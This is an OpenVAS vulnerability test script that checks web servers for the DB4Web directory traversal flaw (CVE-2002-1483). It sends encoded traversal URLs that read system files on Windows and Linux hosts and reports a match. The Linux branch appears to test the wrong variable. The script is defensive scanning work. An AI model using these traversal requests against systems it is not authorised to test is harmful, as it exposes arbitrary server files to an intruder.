###############################################################################
# OpenVAS Vulnerability Test
#
# DB4Web directory traversal
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11182");
  script_version("2022-05-12T09:32:01+0000");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5723");
  script_cve_id("CVE-2002-1483");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2022-05-12 09:32:01 +0000 (Thu, 12 May 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("DB4Web directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your software.");

  script_tag(name:"summary", value:"It is possible to read any file on your
  system through the DB4Web software.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port( default:80 );
host = http_host_name( dont_add_port:TRUE );

cgis = http_get_kb_cgis( port:port, host:host );
if( isnull( cgis ) )
  exit( 0 );

win_files = traversal_files( "windows" );
lin_files = traversal_files( "linux" );

foreach cgi( cgis ) {

  if( "/db4web_c.exe/" >< cgi ) {

    end = strstr( cgi, "/db4web_c.exe/" );
    dir = cgi - end;

    foreach pattern( keys( win_files ) ) {

      file = win_files[pattern];
      file = str_replace( string:file, find:"/", replace:"%5C" );
      url = strcat( dir, "/db4web_c.exe/c%3A%5C", file );

      if( http_vuln_check( port:port, url:url, pattern:pattern, check_header:TRUE ) ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  } else if( "/db4web_c/" >< dir ) {

    end = strstr( cgi, "/db4web_c/" );
    dir = cgi - end;

    foreach pattern( keys( lin_files ) ) {

      file = lin_files[pattern];
      url = strcat( dir, "/db4web_c//", file );

      if( http_vuln_check( port:port, url:url, pattern:pattern, check_header:TRUE ) ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
